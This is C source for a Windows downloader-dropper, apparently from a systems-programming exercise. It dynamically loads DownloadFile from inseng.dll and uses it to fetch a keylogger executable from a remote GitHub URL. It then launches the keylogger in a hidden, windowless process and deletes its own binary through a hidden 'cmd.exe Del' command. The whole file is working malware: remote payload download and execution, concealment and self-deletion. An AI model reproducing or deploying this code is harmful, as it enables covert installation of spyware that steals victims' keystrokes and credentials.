#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <strsafe.h>

#define MALWARE_URL "https://github.com/huyenlovemath/System-Programming/raw/master/window/keylogger/keylogger.exe"
#define MALWARE_FILE "keylogger.exe"
typedef int(WINAPI* t_DownloadFile)(LPCSTR, LPCSTR, int);

bool inseng_downloadFile();
void delMe(wchar_t* cmd);
void runDownloadFile();

int main(int argc, char** argv) {

	if (!inseng_downloadFile()) {

		return 1;
	}

	//create new process to run download file
	printf("Start run download file\n");
	runDownloadFile();

	//time for make a copy of downloader.exe
	Sleep(10000);

	printf("Start delete Downloader.exe\n");
	// create new process to delete downloader.exe
	wchar_t currentFile[1024];
	wchar_t cmd[1024];
	GetModuleFileName(NULL, currentFile, 1024);
	StringCbPrintfW(cmd, 1024, L"cmd.exe /C Del /f /q \"%s\"", currentFile);
	delMe(cmd);
	return 0;

}

bool inseng_downloadFile() {

	//get function DownloadFile by dynamic linking to lib inseng.dll 
	t_DownloadFile DownloadFile = (t_DownloadFile)GetProcAddress(LoadLibraryA("inseng.dll"), "DownloadFile");
	DownloadFile(MALWARE_URL, MALWARE_FILE, 1);
	printf("Download file %s successful\n", MALWARE_FILE);
	return TRUE;

}

void runDownloadFile() {

	//wchar_t cmd[256];

	//StringCbPrintfW(cmd, 256, L"cmd.exe %s", MALWARE_FILE);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	//si.dwFlags = STARTF_USESHOWWINDOW;
	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	CreateProcessW(L".//keylogger.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void delMe(wchar_t* cmd) {

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;

	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {

		int a = GetLastError();
		return;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

}